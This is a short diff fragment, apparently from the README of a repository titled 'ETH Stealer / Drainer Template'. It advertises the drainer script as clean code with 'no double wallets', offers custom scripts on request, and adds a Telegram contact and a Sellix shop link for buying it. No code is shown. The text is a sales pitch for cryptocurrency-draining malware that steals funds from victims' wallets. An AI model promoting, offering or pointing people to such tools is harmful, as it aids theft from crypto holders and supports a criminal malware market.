@@ -13,3 +13,5 @@ ETH Stealer / Drainer Template !
 # INFO:
 the script has a clean code, no double wallets, in addition, I can prepare absolutely any script for you according to your desires
 
+# Contacts: https://t.me/Bmyatina
+# Shop: https://bloki.sellix.io/
